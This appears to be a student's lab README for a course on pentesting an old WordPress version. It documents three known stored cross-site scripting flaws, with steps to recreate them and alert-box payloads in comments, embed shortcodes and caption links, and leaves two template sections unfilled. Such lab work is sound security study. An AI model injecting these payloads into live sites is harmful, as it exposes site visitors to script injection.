# Project 7 - WordPress Pentesting

Time spent: 8 hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.23
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
    * Sign in as a user or administrator.
    * Click reply to the post.
    * In comment, input a basic malicious XSS code using iframe:  
    ```
    <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
    ```
  - [ ] Affected source code:
    - [Ripstech](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/)
    - [Github](https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b)
    - [wpscan](https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936)
    
### 2. WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.13
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
    * Signed in as administrator
    * Created a new post named youtube_embed
    * Put a shortcode with XSS:
    ```
    [embed src='https://www.youtube.com/embed/34567\x3csvg onload=alert('XSS')\x3e'][/embed]
    ```
  - [ ] Affected source code:
    - [Sucuri](https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html)
    - [wpscan](https://wpscan.com/vulnerability/3ee54fc3-f4b4-4c35-8285-9d6719acecf0)
    
### 3. WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
    * Signed in as administrator
    * Created a new post named links
    * Put a following HTML and javascript code :
    ``` 
    <a href="[caption code=">]</a><a title="onload=alert('XSS attack')"> It is just a link </a>
    ```
  - [ ] Affected source code:
    - [Klikki](https://klikki.fi/adv/wordpress3.html)
    - [wp-scan](https://wpscan.com/vulnerability/0f027d7d-674b-4a63-9603-25ea68069c1d)
    
### 4. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 5. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
